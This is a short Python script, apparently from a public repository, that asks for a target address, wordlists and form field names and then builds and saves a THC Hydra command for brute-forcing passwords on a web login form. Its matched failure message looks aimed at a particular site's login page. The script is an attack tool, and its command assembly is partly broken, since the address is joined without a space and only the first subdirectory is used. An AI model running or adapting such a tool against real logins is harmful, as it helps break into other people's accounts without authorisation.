from numpy import savetxt


print("Enter service type to brute force i.e smtp, ssh, http... \n Full list of available services with respect to Hydra's options is mentioned in the repository.")

service = input()

if (service.find("http") != -1):
    print("Enter the address as specified in hydra thc (service://server[:PORT][/OPT])")

    address = input()

    print("Please provide a text file path of subdirectories to brute force through.")

    subs = open(input()).readlines()

    print("Please provide a users text file path to brute force with a semi-colon separeted parameter of the user field's name.")

    inp = input().partition(";")

    users = inp[0]
    uparam = inp[2]

    print("Please provide a passwords text file path to brute force with a semi-colon separeted parameter of the user field's name.")

    inp = input().partition(";")

    passwords = inp[0]
    pparam = inp[2]

    print("Executue the following Hydra string? [n:Y]")

    hydra = ["hydra -L " + users + " -P " + passwords + " -u   -m '" + subs[0] + ":" + uparam + "=^USER^&" + pparam + "=^PASS^:Sorry, your password was incorrect. Please double-check your password.'" + address + " " + service]

    print(hydra)

    if (input() == "Y"):
        savetxt("exechydra.sh", hydra, '%s')

    else:
        print("Program finished.")
        exit


else:
    print("No such service is configured.")